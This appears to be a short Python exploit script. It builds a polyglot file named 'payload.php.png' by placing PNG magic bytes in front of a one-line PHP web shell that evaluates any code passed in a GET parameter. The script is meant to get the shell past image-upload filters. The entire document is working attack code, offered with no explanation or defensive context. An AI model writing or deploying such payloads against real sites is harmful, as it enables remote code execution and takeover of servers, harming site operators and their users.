payload=b''
payload+=bytes.fromhex('89 50 4E 47')
payload+=b"<?php eval($_GET['c']); ?>"
with open('payload.php.png','wb') as f:
    f.write(payload)
